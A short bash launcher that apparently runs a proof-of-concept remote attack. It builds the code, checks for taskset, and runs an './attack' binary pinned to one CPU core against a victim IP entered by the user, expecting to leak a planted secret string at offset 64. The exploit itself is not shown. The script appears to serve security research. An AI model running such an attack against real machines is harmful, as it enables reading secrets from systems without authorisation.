#!/bin/bash

make > /dev/null || exit -1

if ! taskset -V &> /dev/null
then
    echo "'taskset' command could not be found !"
    echo "Please install it first (may be the in the 'util-linux' package)"
    exit 1
fi

cd poc

SECRET_OFFSET=64

echo "###################################################"
echo "Using secret_value_offset "${SECRET_OFFSET}"."
echo "###################################################"

echo "The expected read secret is 'Hello there ! General Kenobi !"
echo "Enter attack paramaters from victim (ending in victim IP):"

read ATTACK_OPTIONS

taskset -c 0 ./attack ${ATTACK_OPTIONS}

cd ..